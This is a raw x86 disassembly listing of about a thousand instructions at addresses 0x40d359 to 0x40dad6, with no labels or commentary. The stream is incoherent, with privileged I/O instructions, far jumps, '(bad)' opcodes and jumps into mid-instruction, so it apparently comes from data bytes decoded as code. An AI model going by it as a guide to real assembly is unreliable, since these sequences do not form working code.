  40d359:	xor    DWORD PTR [eax+edx*2],edi
  40d35c:	mov    eax,0x7dfe401b
  40d361:	dec    esp
  40d362:	sbb    BYTE PTR [ebx+0x13260bd8],cl
  40d368:	sub    eax,DWORD PTR [ecx+0x22]
  40d36b:	cmp    edi,DWORD PTR [eax]
  40d36d:	push   0x6f
  40d36f:	out    0x78,al
  40d371:	cwde   
  40d372:	sbb    DWORD PTR [esi+0x143357ac],0x19
  40d379:	cwde   
  40d37a:	adc    ah,BYTE PTR [eax]
  40d37c:	push   cs
  40d37d:	mov    edx,DWORD PTR [edx+0x33bc8b4f]
  40d383:	gs jmp 0xd2eb:0x7f73
  40d38a:	and    DWORD PTR [eax-0x3ac27bd],edi
  40d390:	cmp    DWORD PTR [edx+0x194a2f47],0x17
  40d397:	jne    0x40d3a7
  40d399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39a:	out    0xfc,al
  40d39c:	rcl    BYTE PTR [ecx-0x6a],cl
  40d39f:	adc    eax,0xcabe2396
  40d3a4:	out    0x76,eax
  40d3a6:	jmp    FWORD PTR [edi-0x24]
  40d3a9:	into   
  40d3aa:	jg     0x40d419
  40d3ac:	mov    ah,bl
  40d3ae:	push   eax
  40d3af:	dec    esi
  40d3b0:	mov    ecx,0xb85b1d42
  40d3b5:	jb     0x40d37a
  40d3b7:	je     0x40d3fd
  40d3b9:	pusha  
  40d3ba:	lock jno 0x40d3db
  40d3bd:	test   eax,0x5c585a8f
  40d3c2:	pop    ecx
  40d3c3:	add    esp,DWORD PTR [ebx-0x327201d0]
  40d3c9:	(bad)  
  40d3ca:	cmp    BYTE PTR [eax+ebp*1-0x3d],dh
  40d3ce:	push   esp
  40d3cf:	mov    ebx,0x2a70b705
  40d3d4:	pusha  
  40d3d5:	push   ebp
  40d3d6:	clc    
  40d3d7:	fcmovbe st,st(4)
  40d3d9:	jmp    0xab0f01dc
  40d3de:	and    BYTE PTR [ebx+0x4f],0x7
  40d3e2:	mov    cl,0xcd
  40d3e4:	mov    cl,0x71
  40d3e6:	shl    DWORD PTR [ecx+0x7524c0e5],cl
  40d3ec:	mov    dl,0xb2
  40d3ee:	xlat   BYTE PTR ds:[ebx]
  40d3ef:	pop    esp
  40d3f0:	sahf   
  40d3f1:	mov    ds:0xe2dbd5d5,al
  40d3f6:	dec    ebx
  40d3f7:	ja     0x40d450
  40d3f9:	dec    esi
  40d3fa:	out    0xea,eax
  40d3fc:	pushf  
  40d3fd:	and    ecx,ebp
  40d3ff:	rcl    BYTE PTR [edi],0x54
  40d402:	or     DWORD PTR [edx+0x4fdbea9b],esi
  40d408:	pop    ss
  40d409:	cli    
  40d40a:	fwait
  40d40b:	dec    BYTE PTR cs:[ecx]
  40d40e:	inc    edi
  40d40f:	mov    al,0x95
  40d411:	sti    
  40d412:	test   al,0xa5
  40d414:	push   eax
  40d415:	(bad)  
  40d416:	xchg   esp,eax
  40d417:	push   DWORD PTR [eax-0x80]
  40d41a:	pop    edi
  40d41b:	mov    al,ds:0x75433315
  40d420:	dec    edi
  40d421:	daa    
  40d422:	xchg   DWORD PTR [eax],esp
  40d424:	pop    eax
  40d425:	bound  esp,QWORD PTR [esi-0x3b486c1e]
  40d42b:	loopne 0x40d4ac
  40d42d:	out    dx,al
  40d42e:	daa    
  40d42f:	inc    BYTE PTR [ecx]
  40d431:	jns    0x40d4ad
  40d433:	add    eax,0x6f7e2f49
  40d438:	sub    BYTE PTR [esi],bl
  40d43a:	lock ds enter 0x7758,0x71
  40d440:	push   0x2b
  40d442:	icebp  
  40d443:	lock aas 
  40d445:	das    
  40d446:	push   ebp
  40d447:	mov    edi,0x1fc40b5d
  40d44c:	mov    ds:0x33e3e9f5,eax
  40d451:	(bad)  
  40d452:	and    bl,BYTE PTR [edi]
  40d454:	jl     0x40d443
  40d456:	sbb    bl,ch
  40d458:	push   esi
  40d459:	xchg   ebp,eax
  40d45a:	std    
  40d45b:	sub    ebx,esp
  40d45d:	or     al,0x9b
  40d45f:	fwait
  40d460:	loope  0x40d428
  40d462:	mov    esp,0x7b51db
  40d467:	jmp    0x40d498
  40d469:	dec    esi
  40d46a:	mov    DWORD PTR [ebp+0x52],ebp
  40d46d:	mov    al,ds:0x54ba41c5
  40d472:	fist   WORD PTR [edi+esi*1-0x56a0e49b]
  40d479:	mov    edx,0x502dfaa5
  40d47e:	repnz mov di,0x5c0d
  40d483:	xlat   BYTE PTR ds:[ebx]
  40d484:	pusha  
  40d485:	and    BYTE PTR [ecx+ecx*8+0x7b],0x3
  40d48a:	popa   
  40d48b:	sar    BYTE PTR [eax+0x39d10dda],cl
  40d491:	add    DWORD PTR [eax+0x25bd49d6],0x7a36fa9
  40d49b:	dec    esp
  40d49c:	cs push ds
  40d49e:	repnz mov ch,0xc
  40d4a1:	(bad)  
  40d4a2:	mov    bl,0xd4
  40d4a4:	pop    ecx
  40d4a5:	mov    edx,0x2f664ecc
  40d4aa:	retf   
  40d4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ac:	aas    
  40d4ad:	xor    al,0xab
  40d4af:	inc    ebx
  40d4b0:	test   DWORD PTR [ebp-0x3cda46c1],esp
  40d4b6:	and    eax,0xff6cc33f
  40d4bb:	faddp  st(3),st
  40d4bd:	add    bh,dh
  40d4bf:	lods   eax,DWORD PTR ds:[esi]
  40d4c0:	ja     0x40d526
  40d4c2:	add    ebp,DWORD PTR [edi+esi*4]
  40d4c5:	out    0xc4,al
  40d4c7:	stc    
  40d4c8:	mov    bl,0xe7
  40d4ca:	ss dec ecx
  40d4cc:	cdq    
  40d4cd:	int    0xa2
  40d4cf:	clc    
  40d4d0:	dec    edx
  40d4d1:	cli    
  40d4d2:	inc    eax
  40d4d3:	cli    
  40d4d4:	xchg   edx,eax
  40d4d5:	jne    0x40d554
  40d4d7:	xchg   esp,eax
  40d4d8:	mov    ecx,0x70b79c08
  40d4dd:	out    0xdc,al
  40d4df:	icebp  
  40d4e0:	inc    esi
  40d4e1:	data16 jne 0x40d479
  40d4e4:	inc    esi
  40d4e5:	pop    eax
  40d4e6:	test   DWORD PTR [edx],edx
  40d4e8:	cmc    
  40d4e9:	push   eax
  40d4ea:	sahf   
  40d4eb:	fmul   QWORD PTR [edx+0x64e3abae]
  40d4f1:	mov    ecx,DWORD PTR [ecx-0x44]
  40d4f4:	push   0x75
  40d4f6:	push   edx
  40d4f7:	pop    esp
  40d4f8:	test   al,0xe2
  40d4fa:	or     DWORD PTR [eax+0x7fe1a0d],ecx
  40d500:	adc    eax,0x726820db
  40d505:	aaa    
  40d506:	xor    al,0x49
  40d508:	dec    esp
  40d509:	mov    dh,0xa7
  40d50b:	mov    esp,0x793641a8
  40d510:	jp     0x40d57e
  40d512:	(bad)  
  40d513:	xor    dh,bl
  40d515:	xchg   ecx,eax
  40d516:	imul   eax,DWORD PTR [ebp-0x19ca8761],0x45
  40d51d:	adc    BYTE PTR [eax],0x63
  40d520:	aad    0xa9
  40d522:	mov    BYTE PTR [ebp-0x7b],bl
  40d525:	cmp    al,BYTE PTR [edx]
  40d527:	retf   
  40d528:	add    al,0xbe
  40d52a:	or     cl,bh
  40d52c:	paddd  mm6,QWORD PTR [eax]
  40d52f:	xchg   ebp,eax
  40d530:	mov    ebx,0x74bff8b1
  40d535:	push   ds
  40d536:	sti    
  40d537:	stos   BYTE PTR es:[edi],al
  40d538:	xchg   DWORD PTR [esi-0xf19d6b5],ecx
  40d53e:	cdq    
  40d53f:	outs   dx,DWORD PTR ds:[esi]
  40d540:	and    eax,0xfee1a96e
  40d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d546:	rol    BYTE PTR [edi],cl
  40d548:	loope  0x40d58e
  40d54a:	and    al,0xa7
  40d54c:	and    eax,0x7c807e2d
  40d551:	sbb    ah,cl
  40d553:	inc    esp
  40d554:	fstp   DWORD PTR [ecx-0x2dea56b2]
  40d55a:	pop    ebx
  40d55b:	inc    esp
  40d55c:	imul   ebx,ebp,0x962fe202
  40d562:	pop    ds
  40d563:	dec    ebx
  40d564:	pop    edi
  40d565:	mov    esi,0x629c11f5
  40d56a:	ins    BYTE PTR es:[edi],dx
  40d56b:	es cmc 
  40d56d:	fwait
  40d56e:	rcl    bh,1
  40d570:	leave  
  40d571:	xor    BYTE PTR [ebx],0xc3
  40d574:	or     eax,0x2e07fcdc
  40d579:	and    esi,DWORD PTR [ebx-0x60]
  40d57c:	pop    ds
  40d57d:	push   cs
  40d57e:	or     bl,BYTE PTR [edi-0x7bf5b735]
  40d584:	dec    edi
  40d585:	push   edi
  40d586:	fimul  WORD PTR [ebx-0x76]
  40d589:	adc    eax,ecx
  40d58b:	mov    cl,0x6e
  40d58d:	sub    DWORD PTR [edi+0x6457f7b2],eax
  40d593:	sbb    dl,BYTE PTR [eax]
  40d595:	add    BYTE PTR [esi-0x3e263a16],bh
  40d59b:	xor    DWORD PTR [ecx-0x43],esi
  40d59e:	lahf   
  40d59f:	test   eax,0x90ecceb9
  40d5a4:	jnp    0x40d56e
  40d5a6:	mov    eax,ebp
  40d5a8:	inc    eax
  40d5a9:	sub    al,0x35
  40d5ab:	xchg   DWORD PTR [ecx+esi*2-0x3273130c],esp
  40d5b2:	out    0x51,al
  40d5b4:	mov    WORD PTR [edi+edx*2+0x71b12703],ss
  40d5bb:	sub    al,0xc5
  40d5bd:	inc    edx
  40d5be:	repz ret 0xcab3
  40d5c2:	fwait
  40d5c3:	mov    ah,0xea
  40d5c5:	add    DWORD PTR [ebp-0x38],0x7f
  40d5c9:	arpl   WORD PTR [edi+0x7d],dx
  40d5cc:	cli    
  40d5cd:	mov    bh,0x9b
  40d5cf:	std    
  40d5d0:	sbb    eax,DWORD PTR [edi]
  40d5d2:	scas   al,BYTE PTR es:[edi]
  40d5d3:	jmp    0x6b30:0xa1a66392
  40d5da:	fist   WORD PTR [ebx-0x39]
  40d5dd:	in     al,0xf
  40d5df:	stos   BYTE PTR es:[edi],al
  40d5e0:	pusha  
  40d5e1:	push   es
  40d5e2:	pop    edx
  40d5e3:	adc    DWORD PTR [ecx],ebp
  40d5e5:	cs fs aaa 
  40d5e8:	retf   0xb2d2
  40d5eb:	fnstenv [edi+0x4f1c2dac]
  40d5f1:	or     BYTE PTR [ebp+edi*8-0x27765d09],dh
  40d5f8:	fisttp DWORD PTR [edx+0x4b66ac5e]
  40d5fe:	shl    cl,cl
  40d600:	fwait
  40d601:	adc    ch,0xe2
  40d604:	push   ebx
  40d605:	aas    
  40d606:	lock test DWORD PTR ds:0xafd41533,edx
  40d60d:	shl    BYTE PTR [ecx],0xe9
  40d610:	sub    dh,ah
  40d612:	xchg   ebp,eax
  40d613:	jo     0x40d5b2
  40d615:	dec    esp
  40d616:	out    dx,al
  40d617:	dec    edi
  40d618:	xchg   ecx,eax
  40d619:	add    DWORD PTR [ebp+0x8d1b3b1],edi
  40d61f:	cld    
  40d620:	inc    edx
  40d621:	fsub   DWORD PTR [ecx+0xd]
  40d624:	stos   BYTE PTR es:[edi],al
  40d625:	mov    cl,0x68
  40d627:	adc    cl,BYTE PTR [edx-0x27]
  40d62a:	and    al,0xb1
  40d62c:	dec    ecx
  40d62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d62e:	ds jne 0x40d5be
  40d631:	arpl   WORD PTR [edi],si
  40d633:	jo     0x40d5bd
  40d635:	xchg   ebx,eax
  40d636:	mov    esp,0xf9678d50
  40d63b:	add    DWORD PTR [edx+0x4fb5da8],0x2c
  40d642:	push   es
  40d643:	and    DWORD PTR [edi+0x598e30f7],ebp
  40d649:	popf   
  40d64a:	and    eax,0x4588802c
  40d64f:	xchg   ebx,eax
  40d650:	mov    edi,edi
  40d652:	mov    ecx,DWORD PTR [esi-0x68]
  40d655:	xor    DWORD PTR [ebx],eax
  40d657:	adc    eax,0x5015fb5b
  40d65c:	mov    dl,0x66
  40d65e:	sbb    ebp,DWORD PTR [ecx+0x76]
  40d661:	mov    edi,0xb779627d
  40d666:	rcl    BYTE PTR [edi-0x69136bf3],cl
  40d66c:	es mov dh,0xe5
  40d66f:	push   edi
  40d670:	dec    esi
  40d671:	add    eax,0xc11ba62c
  40d676:	call   0xfb07:0xea658461
  40d67d:	frstor ds:0x89cf45f3
  40d683:	sahf   
  40d684:	popf   
  40d685:	lds    ebx,FWORD PTR ds:0x37b2c975
  40d68b:	(bad)  
  40d68c:	fistp  QWORD PTR [eax-0x1100996d]
  40d692:	add    al,0x69
  40d694:	fstp   QWORD PTR [ecx]
  40d696:	dec    esi
  40d697:	shr    DWORD PTR [ebp+0x3c235d0a],1
  40d69d:	stc    
  40d69e:	fistp  WORD PTR [ebx+eiz*2]
  40d6a1:	daa    
  40d6a2:	mov    ch,0xe6
  40d6a4:	mov    ch,0xe0
  40d6a6:	imul   esp,DWORD PTR [edx+0x6f45fec7],0xc513bd7b
  40d6b0:	cld    
  40d6b1:	sbb    dl,BYTE PTR ds:0x3a7e1dca
  40d6b7:	jmp    0x40d6e2
  40d6b9:	jo     0x40d65b
  40d6bb:	xor    ch,ch
  40d6bd:	jge    0x40d66c
  40d6bf:	shl    ecx,1
  40d6c1:	mov    ds:0x2432034e,al
  40d6c6:	mov    ds:0x86e9cfcc,eax
  40d6cb:	(bad)  
  40d6cc:	xor    al,0xa7
  40d6ce:	dec    ebx
  40d6cf:	mov    ah,0xb5
  40d6d1:	ins    DWORD PTR es:[edi],dx
  40d6d2:	fwait
  40d6d3:	adc    eax,0x727b0570
  40d6d8:	mov    bl,0xe4
  40d6da:	add    ebp,DWORD PTR [ebx]
  40d6dc:	jo     0x40d6ac
  40d6de:	and    eax,0xab145ab6
  40d6e3:	sbb    edi,DWORD PTR [edx-0x77]
  40d6e6:	jnp    0x40d6e7
  40d6e8:	loop   0x40d747
  40d6ea:	outs   dx,BYTE PTR ds:[esi]
  40d6eb:	mov    cs:0xcbc40b31,al
  40d6f1:	mov    eax,ds:0x1147e0fb
  40d6f6:	add    cl,cl
  40d6f8:	mov    eax,0xb225fa53
  40d6fd:	xchg   esi,eax
  40d6fe:	push   esi
  40d6ff:	rcr    ah,1
  40d701:	mov    ecx,0x1b8dfe7a
  40d706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d707:	mov    ch,0xb8
  40d709:	jle    0x40d6ca
  40d70b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d70c:	add    DWORD PTR [edx],esp
  40d70e:	call   0x1669:0xcf103dd7
  40d715:	dec    eax
  40d716:	add    al,BYTE PTR [ebp+0x7d4a91f0]
  40d71c:	mov    edx,0xc73f8088
  40d721:	test   dh,ah
  40d723:	xchg   esi,eax
  40d724:	mov    dh,0xa2
  40d726:	push   ds
  40d727:	arpl   WORD PTR [edi-0x1dcc0db6],ax
  40d72d:	or     eax,esi
  40d72f:	(bad)  
  40d730:	xor    edi,ecx
  40d732:	xor    eax,0x1126eb38
  40d737:	sbb    edx,DWORD PTR [esi+0xf4ea951]
  40d73d:	pop    edx
  40d73e:	ins    DWORD PTR es:[edi],dx
  40d73f:	int    0xb4
  40d741:	loope  0x40d7a6
  40d743:	jae    0x40d737
  40d745:	sub    DWORD PTR ds:0x5da5a335,esp
  40d74b:	nop
  40d74c:	leave  
  40d74d:	into   
  40d74e:	shr    BYTE PTR ds:0x62e37d0b,0xb4
  40d755:	imul   ebp,DWORD PTR [edx+0x1f],0x31
  40d759:	ret    0x9c0a
  40d75c:	retf   
  40d75d:	imul   eax,DWORD PTR [ebx-0x7f541cff],0x637ac0b0
  40d767:	lahf   
  40d768:	stos   DWORD PTR es:[edi],eax
  40d769:	daa    
  40d76a:	dec    esp
  40d76b:	mov    bh,0x1f
  40d76d:	push   0x73
  40d76f:	rcl    DWORD PTR [ebx+esi*8],cl
  40d772:	scas   al,BYTE PTR es:[di]
  40d774:	pop    ebp
  40d775:	(bad)  
  40d776:	ins    BYTE PTR es:[edi],dx
  40d777:	pop    ebp
  40d778:	xlat   BYTE PTR ds:[ebx]
  40d779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d77a:	mov    eax,0x30197e7d
  40d77f:	inc    edx
  40d780:	mov    esp,0x1275ff2c
  40d785:	ja     0x40d740
  40d787:	scas   eax,DWORD PTR es:[edi]
  40d788:	jmp    0xae7e:0xeb8b2f47
  40d78f:	pop    ebp
  40d790:	jg     0x40d71d
  40d792:	push   edi
  40d793:	popf   
  40d794:	pop    eax
  40d795:	and    al,0xcc
  40d797:	fisub  DWORD PTR [edx+edi*1+0x6]
  40d79b:	fsubr  QWORD PTR [eax+0x6516a49]
  40d7a1:	bound  esp,QWORD PTR ds:0x7fd05257
  40d7a7:	xlat   BYTE PTR ds:[ebx]
  40d7a8:	mov    bh,0xb7
  40d7aa:	add    al,0xbb
  40d7ac:	push   cs
  40d7ad:	pop    edi
  40d7ae:	mov    esi,0xac61641b
  40d7b3:	cmp    eax,0xbcf69dd3
  40d7b8:	sar    ecx,0x34
  40d7bb:	xor    al,0x25
  40d7bd:	jne    0x40d755
  40d7bf:	fwait
  40d7c0:	fwait
  40d7c1:	push   eax
  40d7c2:	add    BYTE PTR ds:0x77363920,0x93
  40d7c9:	jecxz  0x40d7a6
  40d7cb:	js     0x40d781
  40d7cd:	stos   BYTE PTR es:[edi],al
  40d7ce:	cld    
  40d7cf:	outs   dx,DWORD PTR ds:[esi]
  40d7d0:	xor    BYTE PTR [ebx-0x64],cl
  40d7d3:	pusha  
  40d7d4:	sub    al,0xf1
  40d7d6:	mov    bl,bh
  40d7d8:	iret   
  40d7d9:	pop    edx
  40d7da:	mov    bh,0xfe
  40d7dc:	cmp    ebp,eax
  40d7de:	mov    dh,0x6d
  40d7e0:	sbb    esi,DWORD PTR ds:0xad605198
  40d7e6:	jp     0x40d83e
  40d7e8:	sbb    BYTE PTR [ebx-0xe],bl
  40d7eb:	inc    ecx
  40d7ec:	cmc    
  40d7ed:	cmp    DWORD PTR [edx+0x28],edx
  40d7f0:	xor    al,0xed
  40d7f2:	stc    
  40d7f3:	stc    
  40d7f4:	dec    esi
  40d7f5:	push   eax
  40d7f6:	cdq    
  40d7f7:	jge    0x40d865
  40d7f9:	push   ecx
  40d7fa:	mov    BYTE PTR [ebx-0x3f],bh
  40d7fd:	and    BYTE PTR [edi+eax*4-0x3c122edf],dh
  40d804:	stos   DWORD PTR es:[edi],eax
  40d805:	sub    al,0x31
  40d807:	lods   eax,DWORD PTR ds:[esi]
  40d808:	mov    al,BYTE PTR [ebx]
  40d80a:	mov    ds:0xb2f7a916,eax
  40d80f:	mov    ebx,0xcf02e9c4
  40d814:	mov    cl,BYTE PTR [ebx-0x5b]
  40d817:	fidivr DWORD PTR [esi+0x79d2c4b0]
  40d81d:	inc    ecx
  40d81e:	cmp    BYTE PTR [esi-0x73eaaa60],ch
  40d824:	fcmovb st,st(6)
  40d826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d827:	dec    ecx
  40d828:	jno    0x40d88b
  40d82a:	sub    DWORD PTR fs:[ebx+0x4a72d356],edx
  40d831:	mov    bl,0x68
  40d833:	fldcw  WORD PTR [edx-0x42]
  40d836:	lahf   
  40d837:	ja     0x40d7b9
  40d839:	sub    edx,esp
  40d83b:	sbb    al,0x84
  40d83d:	test   DWORD PTR [edi],ebx
  40d83f:	cld    
  40d840:	sub    DWORD PTR ds:0x99bf689,edx
  40d846:	lods   al,BYTE PTR ds:[esi]
  40d847:	add    dl,cl
  40d849:	mov    al,BYTE PTR [edx]
  40d84b:	or     ebx,edx
  40d84d:	dec    edx
  40d84e:	inc    ebx
  40d84f:	into   
  40d850:	dec    ecx
  40d851:	enter  0x61a7,0x8d
  40d855:	fwait
  40d856:	jbe    0x40d86b
  40d858:	adc    DWORD PTR [ebx-0x64],0xffffff9f
  40d85c:	repnz pop esi
  40d85e:	jmp    0x40d870
  40d860:	and    al,0x62
  40d862:	sbb    al,0xae
  40d864:	dec    ecx
  40d865:	pop    ss
  40d866:	sub    DWORD PTR [ecx+ecx*4-0x4a],ebx
  40d86a:	mov    dh,BYTE PTR [edx+0x1c956a20]
  40d870:	das    
  40d871:	mov    ds:0x9185bd,al
  40d876:	sub    eax,0x169f84d4
  40d87b:	popa   
  40d87c:	adc    eax,0x5d7e691f
  40d881:	lahf   
  40d882:	and    DWORD PTR [edi+0x26],0xf28360b6
  40d889:	mov    bh,0x19
  40d88b:	cmp    al,0xef
  40d88d:	outs   dx,DWORD PTR ds:[esi]
  40d88e:	out    dx,al
  40d88f:	push   cs
  40d890:	(bad)  
  40d891:	mov    esi,0xdd1a7a29
  40d896:	inc    eax
  40d897:	in     eax,dx
  40d898:	cmc    
  40d899:	fcmovb st,st(1)
  40d89b:	pop    es
  40d89c:	cmp    eax,0x71cab65
  40d8a1:	and    DWORD PTR [edi],edx
  40d8a3:	or     DWORD PTR [edx+0x3e303032],ebx
  40d8a9:	xor    eax,0x421cfbc8
  40d8ae:	or     eax,0x21f307d9
  40d8b3:	and    edx,eax
  40d8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8b6:	jns    0x40d865
  40d8b8:	and    ecx,DWORD PTR [eax+0x52d839fb]
  40d8be:	bound  esp,QWORD PTR [esi-0x58240fc7]
  40d8c4:	pushaw 
  40d8c6:	inc    ecx
  40d8c7:	scas   al,BYTE PTR es:[edi]
  40d8c8:	mov    bl,0x21
  40d8ca:	sbb    eax,0x87cf143e
  40d8cf:	loope  0x40d8e4
  40d8d1:	jle    0x40d8ea
  40d8d3:	outs   dx,DWORD PTR ds:[esi]
  40d8d4:	lds    ebx,FWORD PTR [eax-0x68da23c8]
  40d8da:	frstor [esi]
  40d8dc:	shl    esp,0xf1
  40d8df:	pop    ss
  40d8e0:	stos   DWORD PTR es:[edi],eax
  40d8e1:	or     edx,esi
  40d8e3:	mov    cl,0x5d
  40d8e5:	jg     0x40d87a
  40d8e7:	cwde   
  40d8e8:	push   cs
  40d8e9:	call   0x62fb:0xeca8474f
  40d8f0:	inc    esi
  40d8f1:	xor    bl,BYTE PTR [ebp+0x5c629ebc]
  40d8f7:	add    BYTE PTR [ebp+0x75b84df6],bh
  40d8fd:	jle    0x40d8ef
  40d8ff:	push   ecx
  40d900:	cmp    al,0xe
  40d902:	addr16 cmc 
  40d904:	or     eax,0x1c8459a6
  40d909:	mov    ah,0xdc
  40d90b:	push   ebx
  40d90c:	int3   
  40d90d:	test   al,0xe6
  40d90f:	fnsave [eax-0x4c6edde9]
  40d915:	pushf  
  40d916:	fiadd  DWORD PTR [esi+edi*2]
  40d919:	jp     0x40d991
  40d91b:	inc    ebp
  40d91c:	inc    ebp
  40d91d:	fwait
  40d91e:	add    eax,DWORD PTR [ecx]
  40d920:	in     eax,dx
  40d921:	mov    edi,0x318e730d
  40d926:	cmp    dh,dh
  40d928:	imul   ebp,DWORD PTR ds:0x5de32206,0x29b1ce08
  40d932:	dec    esp
  40d933:	xchg   esi,eax
  40d934:	shl    dh,0xaa
  40d937:	fsubr  QWORD PTR [edi+edx*2-0x24]
  40d93b:	jge    0x40d8cf
  40d93d:	sbb    al,0xe2
  40d93f:	imul   DWORD PTR [ebx]
  40d941:	pushf  
  40d942:	jecxz  0x40d8f2
  40d944:	sahf   
  40d945:	xchg   esi,eax
  40d946:	or     DWORD PTR [ebx+0x7c5b852a],edi
  40d94c:	sub    eax,0x9655a03e
  40d951:	push   es
  40d952:	jo     0x40d953
  40d954:	cmp    BYTE PTR ds:0xdd6ba279,ah
  40d95a:	stos   BYTE PTR es:[edi],al
  40d95b:	stos   BYTE PTR es:[edi],al
  40d95c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d95d:	sub    BYTE PTR [esi-0x7e58fa78],al
  40d963:	dec    ebp
  40d964:	xchg   esi,eax
  40d965:	enter  0x5d66,0xd5
  40d969:	add    ebp,eax
  40d96b:	mov    DWORD PTR [ebx-0x46],0xf2e95e79
  40d972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d973:	in     eax,dx
  40d974:	mov    ebx,0x6c28806f
  40d979:	and    DWORD PTR [edi],eax
  40d97b:	outs   dx,BYTE PTR ds:[esi]
  40d97c:	in     al,dx
  40d97d:	test   al,0x21
  40d97f:	dec    esp
  40d980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d981:	mov    edx,0x3dd7601f
  40d986:	fs clc 
  40d988:	xor    DWORD PTR [edx],0x1d
  40d98b:	xor    bl,BYTE PTR ds:0xaea86eb8
  40d991:	jle    0x40d97b
  40d993:	dec    eax
  40d994:	enter  0xbfb3,0x65
  40d998:	sub    BYTE PTR [edi-0x13e79bf9],ah
  40d99e:	jbe    0x40da06
  40d9a0:	xor    ch,BYTE PTR [esi]
  40d9a2:	lods   al,BYTE PTR ds:[esi]
  40d9a3:	sbb    esp,DWORD PTR [esi]
  40d9a5:	das    
  40d9a6:	in     al,dx
  40d9a7:	inc    eax
  40d9a8:	les    esp,FWORD PTR [eax]
  40d9aa:	xchg   ecx,eax
  40d9ab:	test   al,0x9
  40d9ad:	jae    0x40d9e7
  40d9af:	mov    eax,ds:0xdec3bed9
  40d9b4:	xor    esp,esi
  40d9b6:	fild   QWORD PTR [ecx+0x17025d0e]
  40d9bc:	jns    0x40d9c5
  40d9be:	stos   BYTE PTR es:[edi],al
  40d9bf:	push   edx
  40d9c0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d9c2:	ins    DWORD PTR es:[edi],dx
  40d9c3:	test   BYTE PTR [eax],ch
  40d9c5:	inc    esp
  40d9c6:	cmp    bl,BYTE PTR [ecx-0x13]
  40d9c9:	and    BYTE PTR [ecx],cl
  40d9cb:	dec    ebp
  40d9cc:	mov    ebx,0xe2145f60
  40d9d1:	(bad)  
  40d9d2:	(bad)  
  40d9d4:	inc    ebx
  40d9d5:	mov    dl,0xa1
  40d9d7:	icebp  
  40d9d8:	pop    ebp
  40d9d9:	fnstenv [eax]
  40d9db:	iret   
  40d9dc:	sub    eax,0x94bb2a75
  40d9e1:	add    eax,0xeda9974a
  40d9e6:	push   cs
  40d9e7:	jl     0x40d9db
  40d9e9:	les    edx,FWORD PTR [esi]
  40d9eb:	xor    eax,0xf2c1ae03
  40d9f0:	mov    ds:0xd39b1163,al
  40d9f5:	xchg   esp,eax
  40d9f6:	pusha  
  40d9f7:	and    eax,0xd137d072
  40d9fd:	test   dh,bl
  40d9ff:	sub    al,0xc4
  40da01:	(bad)  
  40da02:	or     ebx,DWORD PTR [ecx+0x5a617134]
  40da08:	aad    0x55
  40da0a:	push   esp
  40da0b:	mov    dh,0x99
  40da0d:	jp     0x40d9f3
  40da0f:	cld    
  40da10:	push   0xffffff94
  40da12:	jb     0x40d9f6
  40da14:	aam    0xfa
  40da16:	xor    DWORD PTR [edi+edi*1-0xb],esi
  40da1a:	mov    ebp,0x6d56374f
  40da1f:	js     0x40d9f0
  40da21:	arpl   WORD PTR [esi-0x41530d5f],sp
  40da27:	dec    ecx
  40da28:	data16 xlat BYTE PTR ds:[ebx]
  40da2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da2b:	int    0x53
  40da2d:	dec    esp
  40da2e:	sti    
  40da2f:	sub    dl,BYTE PTR [ecx-0x3f]
  40da32:	dec    ecx
  40da33:	(bad)  
  40da34:	arpl   WORD PTR ds:0x78ebc837,bp
  40da3a:	(bad)  
  40da3b:	leave  
  40da3c:	sub    eax,0x26aaa664
  40da41:	pusha  
  40da42:	out    dx,eax
  40da43:	fbld   TBYTE PTR [ecx]
  40da45:	push   eax
  40da46:	imul   edi,DWORD PTR [edi],0x89a9471a
  40da4c:	push   0x6d788688
  40da51:	mov    ebx,0xe8e1a78e
  40da56:	aam    0x15
  40da58:	push   0xffffffc8
  40da5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da5b:	jg     0x40d9ec
  40da5d:	or     ebp,DWORD PTR [ebp+0x2ae583e5]
  40da63:	mov    dl,0x97
  40da65:	xor    DWORD PTR [eax+0x4bd48bcd],ebp
  40da6b:	xchg   ebx,eax
  40da6c:	fist   DWORD PTR [edi+0x6f]
  40da6f:	outs   dx,DWORD PTR ds:[esi]
  40da70:	arpl   WORD PTR [edx-0x76624151],cx
  40da76:	in     eax,dx
  40da77:	pushf  
  40da78:	xchg   ebp,eax
  40da79:	(bad)  
  40da7a:	int    0xc2
  40da7c:	push   0x5e5f6960
  40da81:	ds mov ch,0x77
  40da84:	cmp    DWORD PTR [ecx],esi
  40da86:	xchg   edx,eax
  40da87:	xchg   ebx,eax
  40da88:	jo     0x40da1b
  40da8a:	into   
  40da8b:	xor    BYTE PTR [ecx],bl
  40da8d:	lds    edi,FWORD PTR [eax+0x19]
  40da90:	add    BYTE PTR [edx-0x7f1cefe2],dh
  40da96:	mov    ch,0xc9
  40da98:	jge    0x40da9a
  40da9a:	clc    
  40da9b:	or     eax,0x24690e74
  40daa0:	push   ecx
  40daa1:	jle    0x40da43
  40daa3:	dec    ecx
  40daa4:	xchg   edx,eax
  40daa5:	push   esp
  40daa6:	icebp  
  40daa7:	sbb    bl,BYTE PTR [esi-0x1b]
  40daaa:	retf   0x27fc
  40daad:	xor    DWORD PTR [eax],ebx
  40daaf:	fnstsw WORD PTR ds:0x11220f06
  40dab5:	adc    BYTE PTR [edx+0x882dc02],ah
  40dabb:	cmp    dh,dh
  40dabd:	add    eax,0xb44775b7
  40dac2:	cmp    cl,BYTE PTR [eax-0x2b797dee]
  40dac8:	in     al,dx
  40dac9:	fwait
  40daca:	xor    eax,0x104113f7
  40dacf:	test   DWORD PTR [edx+0x70b4bce7],ebx
  40dad5:	aaa    
  40dad6:	push   0xffffffad
